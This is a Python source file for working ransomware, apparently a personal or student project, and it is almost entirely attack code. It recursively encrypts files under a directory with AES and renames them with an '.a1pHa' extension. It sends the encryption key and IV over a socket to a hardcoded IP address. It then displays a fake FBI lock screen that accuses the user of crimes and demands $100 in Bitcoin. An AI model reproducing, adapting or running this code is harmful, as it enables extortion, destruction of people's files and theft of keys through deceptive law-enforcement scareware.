import os
import random
from Crypto.Cipher import AES
import base64
import socket
import threading
from tkinter import *
from tkinter.font import Font, BOLD


def gui(key):
    global state
    state = False
    # Initial Window Setup
    window = Tk()
    window.title("Piracy Warning!!!")
    window.geometry("1100x700")
    window.minsize(1100, 700)
    window.maxsize(1100, 700)
    window.config(bg='black')

    def click():
        global state
        print('click function running')
        check_text = entry.get()
        if check_text == key:
            pass_label = Label(window, text='Decrypting', foreground='red', background='black', font='Helvetica 18')
            pass_label.place(relx=0.8, rely=0.8)
            state = True
            window.destroy()

        elif check_text != key:
            warning_label = Label(window, text='Wrong Key !!!', foreground='red', background='black', font='Helvetica 18')
            warning_label.place(relx=0.8, rely=0.8)
            state = False


    # TITLE
    title = 'YOUR COMPUTER HAS BEEN LOCKED'
    title_font = Font(window, size=36, weight=BOLD)
    title_label = Label(window, text=title, font=title_font, foreground='red', background='black')
    title_label.place(relx=0.076, rely=0.065)

    # IMAGE
    img = PhotoImage(file='fbi.png')
    img_label = Label(window, image=img, background='black')
    img_label.place(relx=0.82, rely=0.2)

    # MESSAGE
    message = f"""
    This operating system is locked due to the violation of the federal laws of
    the United States of America! (Article 1, Section 8, Clause 8; Article 202;
    Article 210 of the Criminal Code of U.S.A. provides for a deprivation of
    liberty for four to twelve years.)

    Following violations were detected:
    Your IP address was used to visit websites containing pornography.
    Spam-messages with terrorist motives were also sent from your computer.
    This computer lock is aimed to stop your illegal activity.

    As a first time offender you are required to pay $100 USD.
    Send BitCoin to the following address:

    """
    msg_label = Label(window, text=message, foreground='green', background='black', font='Helvetica 18')
    msg_label.place(relx=0.07, rely=0.15)

    # ADDRESS
    address = 'Qh6jHed3sh9tUIstB1sR2fG40KoPrJd3'
    add_label = Label(window, text=address, foreground='black', background='white', font='Ariel 18')
    add_label.place(relx=0.275, rely=0.7)

    # EXTRA LABEL
    mess = 'Enter The Key:'
    key_label = Label(window, text=mess, foreground='green', background='black', font='Ariel 18')
    key_label.place(relx=0.07, rely=0.8)

    # ENTRY
    entry = Entry(window, width=40, background='white', fg='black', font='Ariel 18')
    entry.place(relx=0.235, rely=0.8)

    # BUTTON
    button = Button(window, text="OK", command=click, background='white', foreground='black', font='Ariel 14', width=300)
    button.config(width=1, height=1)
    button.place(relx=0.65, rely=0.8025)

    window.mainloop()
    return state


# KEY GENERATION
def generate_key(size):
    key = ''
    for i in range(int(size)):
        key += chr(random.randint(33, 127))
    return key


# IV GENERATION
def generate_iv():
    iv = ''
    for i in range(16):
        iv += chr(random.randint(33, 127))
    return iv


# ENCRYPTION
def aes_encrypt(key, iv, message):
    key = key.encode('utf-8')
    iv = iv.encode('utf-8')
    message_bs64 = base64.b64encode(message)
    aes = AES.new(key, AES.MODE_CBC, iv)
    encrypted = aes.encrypt(pad(128, message_bs64))
    return encrypted


# DECRYPTION
def aes_decrypt(key, iv, cipher_bs64):
    key = key.encode('utf-8')
    iv = iv.encode('utf-8')
    des = AES.new(key, AES.MODE_CBC, iv)
    decrypted_b6 = des.decrypt(cipher_bs64).decode()
    decrypted_b6 = unpad(decrypted_b6)
    decrypted = base64.b64decode(decrypted_b6.encode('utf-8'))
    return decrypted


# PADDING
def pad(size, data):
    pads = size - (len(data) % size)
    data += bytes(chr(pads) * pads, encoding="utf8")
    return data


# UNPADDING
def unpad(text):
    return text[:-ord(text[-1])]


# FILE LISTING
def file_listing(directory_path):
    list_of_contents = os.listdir(directory_path)
    files_list = []
    for item in list_of_contents:
        name, ext = os.path.splitext(f'{directory_path}/{item}')
        if os.path.isfile(f'{directory_path}/{item}'):
            if ext != '.py':
                files_list.append(f'{directory_path}/{item}')
        elif os.path.isdir(f'{directory_path}/{item}'):
            inter_files = file_listing(f'{directory_path}/{item}')
            for pp in inter_files:
                files_list.append(pp)

    return files_list


# ADD EXTENSION
def add_extension(filepath):
    if os.path.isfile(filepath):
        filename, extension = os.path.splitext(filepath)
        changed_path = f'{filename}{extension}.a1pHa'
        os.rename(filepath, changed_path)
    else:
        pass


# REMOVE EXTENSION
def remove_extension(filepath):
    filename, extension = os.path.splitext(filepath)
    if extension == '.a1pHa':
        os.rename(filepath, filename)
    else:
        pass


# DATA TRANSFER
def data_transfer(key, iv, hostname):
    if hostname is None:
        hostname = 'Mac'
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((IP_ADDRESS, PORT))
            s.send(f'{hostname} : {key}, {iv}'.encode('utf-8'))
            s.close()

    except:
        pass


# ENCRYPTION PART
def file_encrypt(key, iv, file_path_list):
    for file_path in file_path_list:
        try:
            with open(file_path, 'rb') as f1:
                file_data = f1.read()
                encrypted = aes_encrypt(key, iv, file_data)

            with open(file_path, 'wb') as f2:
                f2.write(encrypted)

        except Exception as e:
            print(f'file not encrypted {file_path} {e}')

        add_extension(file_path)


# DECRYPTION PART
def file_decrypt(key, iv, file_path_list):
    for file_path in file_path_list:
        try:
            with open(file_path, 'rb') as f3:
                file_data = f3.read()
                decrypted = aes_decrypt(key, iv, file_data)

            with open(file_path, 'wb') as f4:
                f4.write(decrypted)

        except:
            pass

        remove_extension(file_path)


# MAIN ENCRYPT FUNCTION
def main_encrypt(key, iv, director):
    files_list = file_listing(director)
    file_encrypt(key, iv, files_list)


# MAIN DECRYPT FUNCTION
def main_decrypt(key, iv, director):
    verify = gui('Hail TheAlpha')
    if verify:
        files_list = file_listing(director)
        file_decrypt(key, iv, files_list)
    else:
        main_decrypt(key, iv, director)


if __name__ == '__main__':
    #directory = os.environ['USERPROFILE'] + '\\Desktop' + '\\TEST'
    directory = '/Users/jithendranadh/PycharmProjects/Ransomwar/TEST'
    host = os.getenv('COMPUTERNAME')
    IP_ADDRESS = '192.168.121.190'
    PORT = 5678
    key = generate_key(16)
    iv = generate_iv()
    data_transfer(key, iv, host)
    t = threading.Thread(target=main_encrypt, args=(key, iv, directory))
    t.daemon = True
    t.start()

    main_decrypt(key, iv, directory)
